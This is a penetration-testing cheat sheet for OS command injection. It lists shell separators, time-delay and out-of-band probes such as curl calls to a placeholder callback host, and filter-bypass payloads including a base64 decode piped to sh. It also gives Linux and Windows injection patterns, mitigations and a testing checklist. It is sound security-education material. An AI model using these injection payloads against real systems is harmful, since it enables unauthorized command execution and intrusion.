## 💻 OS Command Injection Cheat Sheet

> **Scope:** Authorized testing only. Test lab systems or systems with explicit written permission. Use placeholders (`<TARGET>`, `<PARAM>`, `<USER>`, `<OOB-HOST>`, `<FILE>`) and harmless timing markers; never include real flags, keys, or passwords.
---
### 🧭 **1. Quick Reference**

| Goal | Linux | Windows |
|------|-------|---------|
| Chain | `;` `&&` `\|\|` newline | `&` `&&` `\|\|` newline |
| Pipe | `\|` | `\|` |
| Substitute | `$(...)` / backticks | `$(...)` in PowerShell |
| Sleep probe | `sleep 10` | `ping -n 11 127.0.0.1` |
| OOB probe | `nslookup <OOB-HOST>` | `nslookup <OOB-HOST>` |
| Read (concept) | `cat <FILE>` | `type <FILE>` |

Append a separator plus a harmless command to `<PARAM>` on `<TARGET>` and observe delay, callback, or marker text.

### 🔍 **2. Where to Look**

| Feature | Input |
|---------|-------|
| Network tools | `host`, `ping`, `nslookup`, `traceroute` |
| File / report ops | convert, resize, archive, title, sender, footer |
| Admin panels | diagnostics, log viewers, config editors |
| Headers/cookies | `User-Agent`, `X-Forwarded-For` |

```http
GET http://<TARGET>/diag?host=<PARAM> HTTP/1.1
Host: <TARGET>
```
```http
POST http://<TARGET>/export HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

filename=<USER>&format=pdf
```
Look for raw stdout/stderr, interpreter hints in errors, and success/failure differences.

### ⏱️ **3. Time-Based Detection**

```text
<PARAM>; sleep 10
<PARAM> && sleep 10
<PARAM> | sleep 10
$(sleep 10) / `sleep 10` / newline `%0a`
```
```text
<PARAM> & ping -n 11 127.0.0.1
<PARAM> && timeout /t 10
<PARAM> & powershell -c Start-Sleep 10
```
```bash
curl -s -o /dev/null -w '%{time_total}\n' 'http://<TARGET>/diag?host=<PARAM>%3Bsleep%2010'
curl -s -o /dev/null -w '%{time_total}\n' 'http://<TARGET>/diag?host=<PARAM>'
```

| Result | Interpretation |
|--------|----------------|
| Baseline fast, injected slow | Confirmed execution |
| Both slow | Network latency — retest with other delay |
| Error only / 0-500 flip | Filter/escaping or boolean oracle |

### 👁️ **4. Blind OOB Confirmation**

```text
<PARAM>; nslookup <OOB-HOST>
<PARAM> && curl http://<OOB-HOST>/cmd?p=<PARAM>
<PARAM>; curl -s http://<OOB-HOST>/marker-<USER>
```
Use unique markers per parameter; correlate request and listener timestamps. No real data needs to leave the lab.

### 🪄 **5. Separator and Filter Bypasses**

| Filter / situation | Idea |
|--------------------|------|
| `;` blocked | `&&`, `\|\|`, newline `%0a`, `\r\n` |
| Space blocked | `${IFS}`, `%09`, `{cat,<FILE>}` |
| `cat` blocked | `head`, `tac`, `paste`, globbing |
| Slash / keyword blocked | `${PATH:0:1}` (bash), `c${x}at`, `$(printf ...)` |
| Quotes / substitution | Unquoted tokens; `echo <BASE64_MARKER>\|base64 -d\|sh` |
| URL decoded once | Double encode `%253B`, `%2520` |
| Length limit | Short commands: `id`, `whoami`, `sleep 9` |

```text
%3B sleep 10 / %0Asleep%2010 / %26%26 sleep 10 / %25253B sleep 10
<PARAM>${IFS};sleep${IFS}10
<PARAM>^&^& sleep 10        (Windows cmd escaping)
```
Encoding helps only if a layer before the shell decodes it — confirm with a timing probe.

### 🐧 **6. Linux Patterns**

```text
<PARAM>; id
<PARAM>; whoami
<PARAM>; sleep 10
<PARAM>; nslookup <OOB-HOST>
<PARAM> && echo <MARKER>
```
```bash
curl -s 'http://<TARGET>/diag?host=<PARAM>%3Bid'
curl -s 'http://<TARGET>/diag?host=<PARAM>%3Becho%20UPLOAD_POC_OK'
```

### 🪟 **7. Windows Patterns**

```text
<PARAM> & whoami
<PARAM> & ping -n 11 127.0.0.1
<PARAM> & timeout /t 10
<PARAM> & nslookup <OOB-HOST>
```
```powershell
<PARAM> ; Start-Sleep 10
<PARAM> ; [System.Net.Dns]::GetHostAddresses('<OOB-HOST>')
```
`cmd` uses `&` (unconditional) and `&&` (on success); PowerShell also accepts `;` and `$()`. Test both where relevant.

### 🧪 **8. Safe Confirmation**

- Use `id`, `whoami`, `hostname`, and timing/callback markers as proof.
- Avoid dumping credential stores or tokens; prove reachability with a hash of a non-sensitive file.
- `{{7*7}}` → `49` suggests SSTI, not shell injection.

### 🛠️ **9. Tools**

| Tool | Use |
|------|-----|
| **Burp Repeater** | Parameter and encoding manipulation |
| **ffuf / commix** | Separator fuzzing and lab automation |
| **OOB collector / `curl`** | Callback confirmation and timing comparison |

### 💥 **10. Impact**

RCE with web-app privileges; read/write of source and config; pivot into internal networks or cloud roles; persistence and lateral movement; DoS.

### 🔐 **11. Mitigation**

- Never concatenate input into a shell command; use argument-array APIs (`execFile`, `subprocess` with `shell=False`).
- If a shell is unavoidable, allowlist strictly and escape for the exact interpreter/platform.
- Validate formats with allowlists; replace `ping`/`system()` with native libraries.
- Least privilege, restricted mounts/egress; patch and monitor child processes.

### ✅ **12. Testing Checklist**

- [ ] Authorization/scope and harmless markers confirmed.
- [ ] All separators (`;`, `&&`, `||`, `|`, newline, `&`) tested.
- [ ] Time probes vs baseline; OOB marker; encoding/keyword bypass evidence.
- [ ] Linux/Windows interpreters considered; SSTI ruled out.
- [ ] No real secrets or backdoors stored.

### 📚 **13. References**

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

**💻 Happy Hacking!**
